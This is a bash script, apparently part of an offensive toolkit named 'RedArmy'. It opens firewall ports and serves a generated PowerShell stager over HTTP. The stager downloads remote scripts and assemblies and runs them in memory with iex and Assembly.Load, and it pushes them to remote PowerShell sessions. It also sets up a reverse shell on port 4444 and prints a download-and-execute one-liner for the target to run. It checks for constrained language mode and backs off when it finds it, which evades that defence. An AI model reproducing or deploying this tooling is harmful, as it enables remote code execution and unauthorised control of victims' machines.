#!/usr/bin/env bash

# shellcheck disable=SC2094

### Helpers begin
check_deps() {
    for d in "${deps[@]}"; do
        [[ -n $(command -v "$d") ]] || errx 128 "$d is not installed"
    done; unset d
}
err() { echo -e "${color:+\e[31m}[!] $*\e[0m"; }
errx() { err "${*:2}"; exit "$1"; }
good() { echo -e "${color:+\e[32m}[+] $*\e[0m"; }
info() { echo -e "${color:+\e[37m}[*] $*\e[0m"; }
long_opt() {
    local arg shift="0"
    case "$1" in
        "--"*"="*) arg="${1#*=}"; [[ -n $arg ]] || usage 127 ;;
        *) shift="1"; shift; [[ $# -gt 0 ]] || usage 127; arg="$1" ;;
    esac
    echo "$arg"
    return $shift
}
subinfo() { echo -e "${color:+\e[36m}[=] $*\e[0m"; }
warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
### Helpers end

cleanup() {
    # Close firewall
    subinfo "Closing $rport and $port on $ip interface (using sudo)"
    sudo iptables -D INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
    sudo iptables -D INPUT -p tcp -d "$ip" --dport "$rport" -j ACCEPT

    # Cleanup
    rm -rf "$invade_ps1" "$rshell_ps1"
    find . -ipath "./[^.]*" -type d -empty -delete
}

deploy() {
    local action="$2"
    local name="$1"
    local path="$3"

    case "$action" in
        "get") deploy_get "$name" "$path" ;;
        "get-bin") deploy_get_bin "$name" "$path" ;;
        "run") deploy_run "$name" "$path" ;;
        "run-bin") deploy_run_bin "$name" "$path" ;;
    esac
}

deploy_get() {
    local name="$1"
    local path="$2"

    cat <<EOF
function Get-$name {
    [System.Text.Encoding]::ASCII.GetString(($iwr $url/$path).content)
}
function Deploy-$name {
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.Runspaces.PSSession]
        \$sess
    )

    Invoke-Command -ScriptBlock (
        [scriptblock]::Create(\$(Get-$name))
    ) -Session \$sess
}
EOF
}

deploy_get_bin() {
    local name="$1"
    local path="$2"

    cat <<EOF
function Import-$name {
    Import-Module -Assembly (
        [System.Reflection.Assembly]::Load(($iwr $url/$path).content)
    )
}
function Deploy-$name {
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.Runspaces.PSSession]
        \$sess
    )

    Invoke-Command -ScriptBlock (
        [scriptblock]::Create((Get-Command Import-$name).definition)
    ) -Session \$sess
}
EOF
}

deploy_run() {
    local name="$1"
    local path="$2"

    deploy_get "$name" "$path"
    cat <<EOF
function Invoke-$name {
    iex (
        [System.Text.Encoding]::ASCII.GetString(
            ($iwr $url/$path).content
        )
    )
}
function Invoke-${name}InBg {
    Start-Job -ScriptBlock (
        [scriptblock]::Create(
            'Start-Process -ArgumentList "-c", (
                [scriptblock]::Create(\$(Get-$name))
            ) -NoNewWindow powershell'
        )
    )
}
function Deploy-${name}InBg {
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.Runspaces.PSSession]
        \$sess
    )

    Invoke-Command -AsJob -ScriptBlock (
        [scriptblock]::Create(\$(Get-$name))
    ) -Session \$sess
    sleep 1
    Get-Job | select -last 1 | Receive-Job
}
EOF
}

deploy_run_bin() {
    # TODO implement for exe
    echo -n
}

simplehttp() {
    if [[ -n $(command -v ruby) ]]; then
        ruby -e httpd -r un -- -p "$1"
    elif [[ -n $(command -v python3) ]]; then
        python3 -m http.server "$1"
    elif [[ -n $(command -v python2) ]]; then
        python2 -m SimpleHTTPServer "$1"
    elif [[ -n $(command -v php) ]]; then
        php -S 0.0.0.0:"$1"
    else
        errx 99 "Can't find php, python2, python3, or ruby"
    fi
}

usage() {
    cat <<EOF
Usage: ${0##*/} [OPTIONS] <ip>

Spin up a simple HTTP server to host the RedArmy scripts.

Options:
    -c, --config=FILE    Use the specified config
    -h, --help           Display this help message
    --invade=FILE        Use the specified invade filename instead of
                         invade.html
    --no-color           Disable colorized output
    -p, --port=NUM       Use the specified port (default: 8080)
    -r, --rport=NUM      Use the specified port for reverse shell
                         (default: 4444)
    --rshell=FILE        Use the specified rshell filename instead of
                         rshell.html
    -u, --update         Update git submodules

EOF
    exit "$1"
}

declare -a args deps
unset help update
color="true"
config="config.default"
deps+=("git")
deps+=("iptables")
invade_ps1="invade.html"
port="8080"
rport="4444"
rshell_ps1="rshell.html"

# Check for missing dependencies
check_deps

# Parse command line options
while [[ $# -gt 0 ]]; do
    case "$1" in
        "--") shift && args+=("$@") && break ;;
        "-c"|"--config"*) config="$(long_opt "$@")" || shift ;;
        "-h"|"--help") help="true" ;;
        "--invade"*) invade_ps1="$(long_opt "$@")" || shift ;;
        "--no-color") unset color ;;
        "-p"|"--port"*) port="$(long_opt "$@")" || shift ;;
        "-r"|"--rport"*) rport="$(long_opt "$@")" || shift ;;
        "--rshell"*) rshell_ps1="$(long_opt "$@")" || shift ;;
        "-u"|"--update"*) update="true" ;;
        *) args+=("$1") ;;
    esac
    shift
done
[[ ${#args[@]} -eq 0 ]] || set -- "${args[@]}"

# Check for valid params
[[ -z $help ]] || usage 0
[[ $# -eq 1 ]] || usage 1

# Make sure in serve directory
cd "$(dirname "$0")" || errx 2 "You're doing something horribly wrong"

# Save IP and URL
ip="$1"
url="http://$ip:$port"

# Update submodules
if [[ -n $update ]]; then
    git submodule update --init --recursive
    git submodule foreach ../../scripts/update_module
fi

# Use "./config" if it exists and a config wasn't specified
case "$config" in
    "config.default") [[ ! -f config ]] || config="config" ;;
esac

# Save some variables for convenience
cwd="\$ExecutionContext.SessionState.Path.CurrentLocation"
iwr="iwr -DisableKeepAlive -UseBasicParsing"
languagemode="\$ExecutionContext.SessionState.LanguageMode"
red="\$([char]27)[41m"
reset="\$([char]27)[0m"

# Setup trap
trap cleanup SIGINT

# Create reverse shell powershell script
chmod +x scripts/reverse_powershell # Ensure executable
mkdir -p "$(dirname "$rshell_ps1")"
./scripts/reverse_powershell -p "$rport" "$ip" >"$rshell_ps1"

# Setup invade script
mkdir -p "$(dirname "$invade_ps1")"
cat >"$invade_ps1" <<EOF
if (($languagemode -match "constrained")) {
    echo "Constrained shell detected, retreating"
    return
}

$(
    while read -r name action path; do
        deploy "$name" "$action" "$path"
    done < <(grep -Psv "^\s*(#.*)?$" "$config")
    unset name action path

    # Add reverse shell function
    deploy ReverseShell run "./$rshell_ps1"

    # Add invade shell function
    deploy RedArmy get "$invade_ps1"
)

# Change prompt colors so user knows RedArmy is loaded in current
# session
function prompt {
    "${red}PS \$($cwd)\$(">" * (\$NestedPromptLevel + 1))$reset "
}
EOF

# Let user know what to type
info "iex ($iwr $url/$invade_ps1)"
warn "Don't forget your reverse shell listener on port $rport"

# Open firewall
subinfo "Opening $rport and $port on $ip interface (using sudo)"
sudo iptables -I INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
sudo iptables -I INPUT -p tcp -d "$ip" --dport "$rport" -j ACCEPT

# Serve via HTTP
simplehttp "$port" || cleanup
